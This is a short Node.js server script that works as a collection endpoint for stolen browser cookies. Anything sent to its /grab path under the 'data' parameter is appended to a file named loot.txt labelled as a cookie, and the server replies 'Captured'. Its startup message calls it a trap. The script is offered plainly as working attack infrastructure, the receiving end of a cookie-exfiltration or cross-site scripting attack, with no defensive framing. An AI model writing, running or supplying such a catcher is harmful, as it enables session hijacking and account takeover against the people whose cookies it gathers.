const http = require("http");
const fs = require("fs");
http.createServer((req, res) => {
    const url = require('url').parse(req.url, true);
    if (url.pathname === "/grab") {
        const stolen = `COOKIE: ${url.query.data}\n`;
        fs.appendFileSync("loot.txt", stolen);
        res.end("Captured");
    } else {
        res.end("Inactive");
    }
}).listen(1444, () => {
    console.log("Trap active on http://localhost:1444");
});
